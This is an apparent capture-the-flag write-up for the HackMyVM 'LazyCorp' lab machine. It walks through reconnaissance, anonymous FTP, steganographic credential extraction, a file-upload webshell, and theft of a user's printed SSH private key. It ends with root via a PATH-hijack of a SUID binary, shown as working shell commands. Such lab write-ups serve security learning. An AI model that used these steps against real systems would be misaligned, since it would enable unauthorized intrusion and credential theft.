# LazyCorp

## Description

DevCorp recently launched their internal testing platform for a new blog system. The environment, managed by a junior developer named Arvind, was meant to stay private — but rumors say it accidentally went live for a brief moment.

## Recon

```bash
└─$ sudo netdiscover -r 10.0.2.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:49:be:40      1      60  PCS Systemtechnik GmbH
 10.0.2.26       08:00:27:b8:c1:c2      1      60  PCS Systemtechnik GmbH
```

::: details nmap_scan.log
```log
Open 10.0.2.26:21
Open 10.0.2.26:22
Open 10.0.2.26:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.26

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 46:82:43:4b:ef:e0:b0:50:04:c0:d5:2c:3c:5c:7d:4a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2hBHERpgM+J9HRllTqtT7svnthPH2aDlbAWWgSYdDMLzWxN6dKwOHyr1Zr1DrRQHFfNb2deeXGDwX8zjVjS/HDAFGMY4/5rI6nvM5WnSX4Rl2SSiMW6BhscZnoOd4OyveGZ10sGPKxJc8Rbt9v6hpJcjq7clD0ALEhJHMQf1D85ia3BkyeleChCmne/oz01FwH7cXnv2KLZsUUiaJttJnT724P/Wc6wNdBZBpetl4wZkmSZohx+/4F6yJ7SDbmYxlpm4G4jGoAsgCrrycTU079KWf3pKE8Q6buFtqYaHtIUve68dPAI3wtE5eacqMcg3iKS/jsBnT7tEF8GYzNnJ0gTSu81vxdngBEMUBKag+aXZX+DqtBbIsvfz7zCiWYE18z6NaNjVSTyUYnr5d06YN+r6y6Rrgu9sfQh0RISfWxba7VplItu5mBzxyeMf3aXTkTlMel67BmKesPOwNp6+33RZ+oFrlfdkisZlLIClUvi+wBD0J3uVIu1HUcTZB3mM=
|   256 52:79:ea:92:35:b4:f2:5d:b9:14:f0:21:1c:eb:2f:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBje/WVSD3o77qSU8lM+VaPHiFGQtc0MJxG30xN+FrrDr91CFD4sWxckAfA2dkOodpdYUlzOEXKUzDrJdGnVfC4=
|   256 98:fa:95:86:04:75:31:39:c6:60:26:9e:26:86:82:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjJ53/CHL8BZslI+w4Uz5VYdWp3ERTgae6o9+0ouFdN
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/cms-admin.php /auth-LazyCorp-dev/
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: LazyCorp | Empowering Devs
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## FTP (21) (Anonymous)

```bash
└─$ ftp anonymous@lazycorp.hmv
Connected to lazycorp.hmv.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||38693|)
150 Here comes the directory listing.
drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49898|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg
226 Directory send OK.
ftp> get note.jpg
ftp> exit
```

![writeup-1.png](/assets/pentest/hackmyvm/lazycorp/writeup-1.png)

![writeup-2.png](/assets/pentest/hackmyvm/lazycorp/writeup-2.png)

```bash
└─$ stegseek note.jpg $rockyou
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "creds.txt".
[i] Extracting to "note.jpg.out".

└─$ cat note.jpg.out
Username: dev
Password: d3v3l0pm3nt!nt3rn
```

## HTTP (80)

![writeup.png](/assets/pentest/hackmyvm/lazycorp/writeup.png)


```bash
└─$ feroxbuster -u http://lazycorp.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,403,400 --dont-scan js,css,png,jpeg,jpg,gif -x .php,.html
301      GET        9l       28w      311c http://lazycorp.hmv/blog => http://lazycorp.hmv/blog/
200      GET       22l      100w      744c http://lazycorp.hmv/blog/blog.php
200      GET       17l       47w      582c http://lazycorp.hmv/
200      GET       17l       47w      582c http://lazycorp.hmv/index.html
200      GET        2l        4w       55c http://lazycorp.hmv/robots.txt
301      GET        9l       28w      314c http://lazycorp.hmv/uploads => http://lazycorp.hmv/uploads/
200      GET       26l      136w     1060c http://lazycorp.hmv/blog/blog1.php
```

![writeup-3.png](/assets/pentest/hackmyvm/lazycorp/writeup-3.png)

```bash
└─$ curl http://lazycorp.hmv/blog/blog3.php
<a href="../dev_admin_portal/login.php">internal dev panel?</a>

<!-- Arvind: bro you forgot to disable that old login -->
```

![writeup-4.png](/assets/pentest/hackmyvm/lazycorp/writeup-4.png)

### File Upload

Check robots for maybe hidden paths
```bash
└─$ curl http://lazycorp.hmv/robots.txt
Disallow: /cms-admin.php
Disallow: /auth-LazyCorp-dev/
```

The casing was wrong, if it's lowercase you're able to access the Login page: [http://lazycorp.hmv/auth-lazycorp-dev/login.php](http://lazycorp.hmv/auth-lazycorp-dev/login.php)

![writeup-5.png](/assets/pentest/hackmyvm/lazycorp/writeup-5.png)

You can upload anything, so just get a webshell

![writeup-6.png](/assets/pentest/hackmyvm/lazycorp/writeup-6.png)

## SSH (22)

www-data for some reason can read user's SSH keys, login
```bash
www-data@arvindlazycorp:…/www/html# find /home -type f -ls
find: '/home/arvind/.local/share': Permission denied
find: '/home/arvind/.cache': Permission denied
   131096     20 -rwsr-xr-x   1 root     root        16744 Jul 16 12:22 /home/arvind/reset
   131078      4 -rw-r--r--   1 arvind   arvind        220 Feb 25  2020 /home/arvind/.bash_logout
   131079      4 -rw-r--r--   1 arvind   arvind        807 Feb 25  2020 /home/arvind/.profile
   131095      4 -rw-r--r--   1 arvind   arvind         28 Jul 16 10:26 /home/arvind/user.txt
   131080      4 -rw-r--r--   1 arvind   arvind       3771 Feb 25  2020 /home/arvind/.bashrc
   131093      4 -rw-------   1 arvind   arvind         16 Jul 16 12:50 /home/arvind/.bash_history
   131085      0 -rw-r--r--   1 arvind   arvind          0 Jul  5 14:45 /home/arvind/.sudo_as_admin_successful
   131094      4 -rw-r--r--   1 arvind   arvind        747 Jul  9 07:37 /home/arvind/.ssh/id_rsa.pub
   131082      4 -rw-------   1 arvind   arvind        747 Jul  9 07:47 /home/arvind/.ssh/authorized_keys
   131092      4 -rw-r--r--   1 arvind   arvind       3389 Jul  9 07:37 /home/arvind/.ssh/id_rsa

www-data@arvindlazycorp:…/www/html# cat /home/arvind/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### User.txt

```bash
└─$ nano id_rsa.arvind
└─$ chmod 600 id_rsa.arvind
└─$ ssh arvind@lazycorp.hmv -i id_rsa.arvind
arvind@arvindlazycorp:~$ cat user.txt
FLAG{you_got_foothold_nice}
```

## Privilege Escalation (root)

There's a SUID binary  in CWD
```bash
arvind@arvindlazycorp:~$ ls -alh reset
-rwsr-xr-x 1 root root 17K Jul 16 12:22 reset
arvind@arvindlazycorp:~$ strings reset
...
/usr/bin/reset_site.sh
...
arvind@arvindlazycorp:~$ cat /usr/bin/reset_site.sh
#!/bin/bash

echo "[*] Resetting website from backup..."

# Remove current site
rm -rf /var/www/html/*
# Restore from backup
cp -r /opt/backup/* /var/www/html/
# Set correct ownership
chown -R www-data:www-data /var/www/html/

echo "[+] Done resetting."
```

The paths are not absolute, so they can be hijacked during execution with custom PATH variable and executables.
```bash
arvind@arvindlazycorp:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /tmp rm
-bash: /tmp: Is a directory
arvind@arvindlazycorp:~$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /tmp/rm
arvind@arvindlazycorp:~$ chmod 777 /tmp/rm
arvind@arvindlazycorp:~$ PATH=/tmp:$PATH ./reset
[*] Resetting website from backup...
[+] Done resetting.
arvind@arvindlazycorp:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(arvind) gid=1000(arvind) euid=0(root) groups=1000(arvind),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)
```

### Root.txt

```rootbash-5.0# cat /root/root.txt
FLAG{lazycorp_reset_exploit_worked}
```